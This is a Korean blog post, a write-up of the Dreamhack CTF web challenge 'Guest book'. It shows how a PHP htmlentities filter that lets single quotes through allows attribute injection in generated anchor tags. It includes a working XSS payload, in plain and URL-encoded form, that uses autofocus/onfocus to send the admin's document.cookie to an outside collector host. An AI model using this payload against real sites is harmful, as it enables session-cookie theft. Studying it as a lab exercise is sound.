---
layout: single
title: "[Dreamhack] Guest book write-up"
date: 2024-12-08 19:25 +0900
categories: 
    - WEB-write-up
tag:
typora-root-url: ../
toc: true
toc_sticky: true
toc_label: 목차
author_profile: true
comment: true
sidebar:
    nav: "docs"
---

## [Dreamhack] Guest book

<br>

### 문제 설명

- php로 개발 중인 방명록 서비스입니다.
- 글을 쓰는 기능과, 오류가 발생하는 주소를 관리자가 확인할 수 있도록 하는 Report기능이 존재합니다.
- 플래그는 관리자의 쿠키에 포함되어 있습니다.

<br>

### 풀이

먼저 문제 페이지에 접속해보면 아래와 같이 글을 쓸 수 있는 기능인 GuestBook.php와 관리자 권한으로 접근할 수 있는 Report.php가 존재한다.

<img src="/images/2024-12-08-Guest-book/{A96D8CF6-EA23-48F8-9D38-55401D251695}.png" alt="{A96D8CF6-EA23-48F8-9D38-55401D251695}" style="zoom:50%;" />

<img src="/images/2024-12-08-Guest-book/{8E9280E0-00FC-4DAE-AA9A-7EE2FDC172C9}.png" alt="{8E9280E0-00FC-4DAE-AA9A-7EE2FDC172C9}" style="zoom:50%;" />

<img src="/images/2024-12-08-Guest-book/{78387548-1AD0-421B-A5F8-149631AC6A8A}.png" alt="{78387548-1AD0-421B-A5F8-149631AC6A8A}" style="zoom:50%;" />

<br>

문제 소스 코드를 보면 GuestBook.php에 관한 소스 코드인 것을 알 수 있다. `htmlentities` 함수를 사용해 본문 내용을 필터링하고 `[]()` 형태로 작성하면 a 태그로 치환되어 작성된다.

```php
<?php
function addLink($content){
  $content = htmlentities($content);
  $content = preg_replace('/\[(.*?)\]\((.*?)\)/', "<a href='$2'>$1</a>", $content);
  return $content;
}
?>
```

<br>

따라서 구글 사이트로 본문을 `[]()` 형태로 작성해보면 구글 사이트로 잘 리다이렉트 되는 것을 확인할 수 있다.

<img src="/images/2024-12-08-Guest-book/{34452846-E2D2-48BF-8DBE-AA9401F2B2E1}.png" alt="{34452846-E2D2-48BF-8DBE-AA9401F2B2E1}" style="zoom:50%;" />

<img src="/images/2024-12-08-Guest-book/{EB8B9574-234A-440A-8B1A-B5A7089E315D}.png" alt="{EB8B9574-234A-440A-8B1A-B5A7089E315D}" style="zoom:50%;" />

<br>

이 문제는 학교 선배가 한 번 풀어보라고 하셔서 풀어봤는데 DOM Cloberring으로도 풀 수 있다고 했다. 그래서 인터넷에서 DOM Cloberring에 대해서 좀 찾아보고, 여기에서 DOM Cloberring 취약점이 나올 거라고 생각했다.

![{01952B1C-4D6F-464E-9D6E-59CB9F8C1580}](/images/2024-12-08-Guest-book/{01952B1C-4D6F-464E-9D6E-59CB9F8C1580}.png)

<br>

해당 페이지에서 config.js 코드를 살펴보면 마지막에 `Object.freeze`라고 객체를 동결시켜 버려서 약간 애를 많이 먹다가 0.2 버전에서 DOM Cloberring으로 풀면 되기 때문에 이번 문제에서는 XSS로 풀기로 했다.

```javascript
window.CONFIG = {
  version: "v0.1",
  main: "/",
  debug: false,
  debugMSG: ""
}

// prevent overwrite
Object.freeze(window.CONFIG);
```

<br>

문제소스 코드를 다시 보면 `htmlentities`로 본문 내용을 필터링 하고 있는데 이 함수는 기본적으로 사용하면 `'`, `=`, `+` , `()` `[]`, `!` 등등 필터링에 걸리지 않는 특수문자들이 조금 있기 때문에 javascript 스키마를 사용해서 문제를 풀 수 있다.

```php
<?php
function addLink($content){
  $content = htmlentities($content);
  $content = preg_replace('/\[(.*?)\]\((.*?)\)/', "<a href='$2'>$1</a>", $content);
  return $content;
}
?>
```

<br> 이 부분에서 시간이 조금 오래 걸렸는데 이유는 해당 관리자가 이 url을 접속했을 때 자동으로 a태그를 누르게끔 만들어야 하기 때문이다. 그래서 인터넷을 찾아보다 autofocus와 onfocus를 같이 사용해 해당 href 속성의 url로 이동되게끔 만들었다.

```text
[xss](javascript:location=`https://ueemffv.request.dreamhack.games?cookie=`+document.cookie' id='autoClick' autofocus onfocus='location=this.href')

```

<br>

따라서 report 페이지에는 해당 content라는 파라미터 값에 위 페이로드를 url 인코딩을 수행해 넣어주면 관리자의 쿠키를 공격자의 서버로 보낼 수 있다. (GuestBook.php 앞에 있는 `/` 문자는 지워야 한다.)

![{153AD1EC-A924-4FF5-9F62-3E39953C583E}](/images/2024-12-08-Guest-book/{153AD1EC-A924-4FF5-9F62-3E39953C583E}.png)

```text
GuestBook.php?content=%5Bxss%5D%28javascript%3Alocation%3D%60https%3A%2F%2Ffymhnew.request.dreamhack.games%3Fcookie%3D%60%2Bdocument.cookie%27%20id%3D%27autoClick%27%20autofocus%20onfocus%3D%27location%3Dthis.href%27%29
```

![{BEA13EA3-71FB-4D37-99B2-F142A3653902}](/images/2024-12-08-Guest-book/{BEA13EA3-71FB-4D37-99B2-F142A3653902}.png)
